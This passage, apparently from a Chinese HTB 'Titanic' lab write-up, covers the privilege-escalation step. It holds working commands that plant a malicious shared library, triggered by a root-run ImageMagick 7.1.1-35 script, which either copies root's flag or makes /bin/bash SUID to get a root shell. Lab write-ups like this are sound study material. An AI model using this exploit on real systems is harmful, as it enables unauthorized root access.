+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">developer@titanic:~$ find / -perm -u=s 2&gt;/dev/null</span><br><span class="line">/snap/core20/2434/usr/bin/chfn</span><br><span class="line">/snap/core20/2434/usr/bin/chsh</span><br><span class="line">/snap/core20/2434/usr/bin/gpasswd</span><br><span class="line">/snap/core20/2434/usr/bin/mount</span><br><span class="line">/snap/core20/2434/usr/bin/newgrp</span><br><span class="line">/snap/core20/2434/usr/bin/passwd</span><br><span class="line">/snap/core20/2434/usr/bin/su</span><br><span class="line">/snap/core20/2434/usr/bin/sudo</span><br><span class="line">/snap/core20/2434/usr/bin/umount</span><br><span class="line">/snap/core20/2434/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/snap/core20/2434/usr/lib/openssh/ssh-keysign</span><br><span class="line">/snap/snapd/23545/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/libexec/polkit-agent-helper-1</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/fusermount3</span><br></pre></td></tr></table></figure>
+
+<p>suid也没什么可以用的，在opt下有一个shell脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">developer@titanic:/opt/scripts$ cat identify_images.sh</span><br><span class="line">cd /opt/app/static/assets/images</span><br><span class="line">truncate -s 0 metadata.log</span><br><span class="line">find /opt/app/static/assets/images/ -type f -name &quot;*.jpg&quot; | xargs /usr/bin/magick identify &gt;&gt; metadata.log</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">developer@titanic:/opt/scripts$ magick --version</span><br><span class="line">Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org</span><br><span class="line">Copyright: (C) 1999 ImageMagick Studio LLC</span><br><span class="line">License: https://imagemagick.org/script/license.php</span><br><span class="line">Features: Cipher DPC HDRI OpenMP(4.5)</span><br><span class="line">Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib</span><br><span class="line">Compiler: gcc (9.4)</span><br></pre></td></tr></table></figure>
+
+<p>版本号是7.1.1-35，网上一搜就能搜到有<a target="_blank" rel="noopener" href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8">漏洞</a>cd 进/opt/app/static/assets/images/</p>
+<p>然后输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gcc -x c -shared -fPIC -o ./libxcb.so.1 - &lt;&lt; EOF</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor)) void init()&#123;</span><br><span class="line">    system(&quot;cp /root/root.txt root.txt; chmod 754 root.txt&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
+
+<p>等一下就会cp root.txt进来，拿shell的话就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gcc -x c -shared -fPIC -o ./libxcb.so.1 - &lt;&lt; EOF</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor)) void init()&#123;</span><br><span class="line">    system(&quot;chmod +s /bin/bash&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
+
+<p>然后bash -p即可</p>
+</div>
+        </div>
+        
+            <div class="kratos-copyright text-center clearfix">
+                <span itemprop="copyrightNotice">本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</span>
+            </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+            
+            
+                <div class="post-actions text-center clearfix" id="post-actions">
+                
+                    <a class="donate" href="javascript:;" onclick="krOpenDonateModal()"><i class="fa fa-bitcoin"></i> 打赏</a>
+                
+                
+                    <a class="share" href="javascript:;" onclick="krOpenShareModal()"><i class="fa fa-share-alt"></i> 分享</a>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    <a class="tag-none-link" href="/tags/%E9%9D%B6%E6%9C%BA/" rel="tag">靶机</a>
+                </div>
+                <div class="pull-date">
+                    <time datetime="2025-05-09T09:39:13.291Z" itemprop="dateModified">最后编辑：2025-05-09</time>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" HackmyVM-Learn2Code" href="/2025/05/08/HackmyVM-Learn2Code/"><i class="fa fa-angle-left"></i> 上一篇</a>
+            </div>
+            
+            
+        </nav>
+    
+    
+        <div class="comment-post">
+            
+        </div>
+    
+</article>
+
+        
+
+            </section>
+
+            
+                
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/touxiang.jpg" alt="lvzhouhang" loading="lazy" decoding="auto" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center"></p>
+    </div>
+    <div class="site-meta">
+        <a class="meta-item" href="/archives/">
+            <span class="title">
+                文章
+            </span>
+            <span class="count">
+                78
+            </span>
+        </a>
+        <a class="meta-item" href="/categories/">
+            <span class="title">
+                分类
+            </span>
+            <span class="count">
+                24
+            </span>
+        </a>
+        <a class="meta-item" href="/tags/">
+            <span class="title">
+                标签
+            </span>
+            <span class="count">
+                16
+            </span>
+        </a>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                    <aside id="krw-toc" class="widget widget-kratos-toc clearfix toc-div-class" >
+    <div class="photo-background"></div>
+    <h4 class="widget-title no-after">
+        <i class="fa fa-compass"></i>
+        文章目录
+        <span class="toc-progress-bar" role="progressbar" aria-label="阅读进度："></span>
+    </h4>
+    <div class="textwidget">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#80%E7%AB%AF%E5%8F%A3"><span class="toc-text">80端口</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Gitea"><span class="toc-text">Gitea</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a></li></ol>
+    </div>
+</aside>
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类列表</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/660930334/">660930334</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/BugKu/">BugKu</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/BugKu/%E5%88%B7%E9%A2%98/">刷题</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/HTB/">HTB</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/HackMyVM/">HackMyVM</a><span class="category-list-count">21</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/JAVA/">JAVA</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/MISC/">MISC</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/MISC/NSSCTF/">NSSCTF</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/MISC/NSSCTF/%E5%88%B7%E9%A2%98/">刷题</a><span class="category-list-count">1</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/boot2root/">boot2root</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/ctf/">ctf</a><span class="category-list-count">9</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/ctf/%E5%A4%8D%E7%9B%98/">复盘</a><span class="category-list-count">7</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/ctfshow/">ctfshow</a><span class="category-list-count">7</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/ctfshow/%E5%88%B7%E9%A2%98/">刷题</a><span class="category-list-count">7</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/ctfshow/%E5%88%B7%E9%A2%98/php%E7%89%B9%E6%80%A7/">php特性</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/ctfshow/%E5%88%B7%E9%A2%98/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a><span class="category-list-count">1</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a><span class="category-list-count">15</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/web/ctfshow/">ctfshow</a><span class="category-list-count">7</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/web/ctfshow/%E5%88%B7%E9%A2%98/">刷题</a><span class="category-list-count">7</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/java/">java</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">春秋云镜</a><span class="category-list-count">10</span></li></ul>
+  </aside>
+
+
+            
+                
+  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
+    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
+      <div class="tag-clouds">
+        <a href="/tags/BugKu/" style="font-size: 0.6em;">BugKu</a> <a href="/tags/JAVA/" style="font-size: 0.6em;">JAVA</a> <a href="/tags/MISC/" style="font-size: 0.6em;">MISC</a> <a href="/tags/NSSCTF/" style="font-size: 0.6em;">NSSCTF</a> <a href="/tags/ctf/" style="font-size: 0.7em;">ctf</a> <a href="/tags/ctfshow/" style="font-size: 0.73em;">ctfshow</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 0.68em;">php特性</a> <a href="/tags/sql/" style="font-size: 0.65em;">sql</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 0.63em;">sql注入</a> <a href="/tags/vulnhub/" style="font-size: 0.63em;">vulnhub</a> <a href="/tags/web/" style="font-size: 0.75em;">web</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.6em;">代码审计</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 0.6em;">内网</a> <a href="/tags/%E5%88%B7%E9%A2%98/" style="font-size: 0.78em;">刷题</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 0.6em;">文件包含</a> <a href="/tags/%E9%9D%B6%E6%9C%BA/" style="font-size: 0.8em;">靶机</a>
+      </div>
+  </aside>
+
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/2025/05/09/HTB-Titanic/"><i class="fa fa-book"></i> HTB-Titanic</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2025/05/08/HackmyVM-Learn2Code/"><i class="fa fa-book"></i> HackmyVM-Learn2Code</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2025/05/07/HackmyVM-Five/"><i class="fa fa-book"></i> HackmyVM-Five</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2025/05/06/HackmyVM-Djinn/"><i class="fa fa-book"></i> HackmyVM-Djinn</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2025/05/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Flarum/"><i class="fa fa-book"></i> 春秋云镜-Flarum</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+            
+
+        
+
+                </div>
+    </div>
+</div>
+
+<footer>
+    <div id="footer">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        
+                            <li>
+                                <a href="https://github.com/kratos-rebirth" target="_blank" rel="nofollow">
+                                    <i class="fa fa-github"></i>
+                                </a>
+                            </li>
+                        
+                            <li>
+                                <a href="/atom.xml" target="_blank" rel="nofollow">
+                                    <i class="fa fa-rss"></i>
+                                </a>
+                            </li>
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2025 lvzhouhang 版权所有.</li>
+                            <li>本站已在风雨中飘摇<span id="kr-since">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>自豪地使用 <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a> 主题</li>
+                            <li>站点由 <a href="https://github.com/Candinya/Kratos-Rebirth/graphs/contributors" target="_blank">lvzhouhang</a> 用 <i class="fa fa-heart" style="color:#d43f57"></i> 搭建</li>
+                        </div>
+                        <!-- 额外的追加注入项 -->
+                        
+                            <div>
+                                
+                                    <li>由 <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a> 强力驱动</li>
+                                
+                                    <li>在 <a href="https://github.io" target="_blank">Github Pages</a> 暖心托管</li>
+                                
+                            </div>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                <div class="box theme-box" id="theme-toggle">
+                    <span class="fa fa-adjust"></span>
+                </div>
+            </div>
+            <div id="gotop-box" class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+
+    <div id="kr-donate-modal" class="kr-modal">
+    <div class="kr-modal-bg" onclick="krCloseDonateModal()"></div>
+    <div class="kr-modal-content">
+        <div class="kr-modal-header">
+            <div class="kr-modal-icon">
+                <i class="fa fa-bitcoin"></i>
+            </div>
+            <div class="kr-modal-title">赞助喵</div>
+            <button class="kr-modal-close" onclick="krCloseDonateModal()">
+                <i class="fa fa-times-circle"></i>
+            </button>
+        </div>
+        <div class="kr-modal-body">
+            <div class="kr-donate-message">非常感谢您的喜欢！ <i class="fa fa-heart" style="color:#d43f57"></i></div>
+            <div class="kr-donate-qr" id="kr-donate-qr">
+                
+                    <img class="kr-donate-placeholder" src="https://dev.krt.moe/demo-assets/donate.webp" alt="赞助喵" />
+                
+            </div>
+            <div class="kr-donate-platforms">
+                
+                    
+                        <button class="kr-donate-platform-button" style="color: skyblue;" title="模拟支付" onclick="krDonateModalShowPlatformQR('example_payment', 'skyblue')">
+                            <i class="fa fa-credit-card"></i>
+                        </button>
+                    
+                
+            </div>
+        </div>
+    </div>
+</div>
+<script defer src="/js/kr-modal/donate.min.js"></script>
+
+
+
+
+    <div id="kr-share-modal" class="kr-modal">
+    <div class="kr-modal-bg" onclick="krCloseShareModal()"></div>
+    <div class="kr-modal-content">
+        <div class="kr-modal-header">
+            <div class="kr-modal-icon">
+                <i class="fa fa-share-alt"></i>
+            </div>
+            <div class="kr-modal-title">分享这一刻</div>
+            <button class="kr-modal-close" onclick="krCloseShareModal()">
+                <i class="fa fa-times-circle"></i>
+            </button>
+        </div>
+        <div class="kr-modal-body">
+            <div class="kr-share-message">让朋友们也来瞅瞅！</div>
+            <div class="kr-share-qr" id="kr-share-qr"></div>
+            <div class="kr-share-platforms">
+                
+                    <button class="kr-share-platform-button" style="color: #62b6e7;" title="喵窝" onclick="krShareModalOpenPlatform('https://nya.one/share?text=%3E%20$TITLE%0A%3E%0A%3E%20$SUMMARY%0A----%20$SITE%0A%0A$URL')">
+                        <svg fill="currentColor" width="18" height="18" viewBox="0 0 329 388"><path d="M0,36.226c0,-19.993 16.233,-36.226 36.226,-36.226c13.788,0 25.787,7.719 31.908,19.068l188.366,229.845l0,-111.259c-6.356,5.508 -14.645,8.843 -23.707,8.843c-19.994,0 -36.226,-16.232 -36.226,-36.226c-0,-8.551 2.968,-16.413 7.93,-22.613l-0.015,-0.013l56.614,-69.08c6.2,-11.073 18.047,-18.565 31.63,-18.565c19.994,0 36.227,16.233 36.227,36.226l-0,314.644c-0,19.994 -16.233,36.226 -36.227,36.226c-13.166,0 -24.701,-7.039 -31.044,-17.555l-189.229,-230.899l-0,212.228c-0,19.994 -16.233,36.226 -36.227,36.226c-19.993,0 -36.226,-16.232 -36.226,-36.226l0,-314.644Z" /></svg>
+                    </button>
+                
+            </div>
+        </div>
+    </div>
+</div>
+<script defer src="/js/kr-modal/share.min.js"></script>
+
+
+
+<!-- 额外的追加注入项 -->
+
+
+        <script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+
+  <script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
+
+
+
+  <script defer src="/vendors/viewerjs@1.11.6/dist/viewer.min.js"></script>
+
+
+<script defer src="/js/kr-core.min.js"></script>
+
+
+  <script defer src="/js/kr-pjax.min.js"></script>
+
+
+<!-- 额外的追加注入项 -->
+
+
+    </body>
+</html>
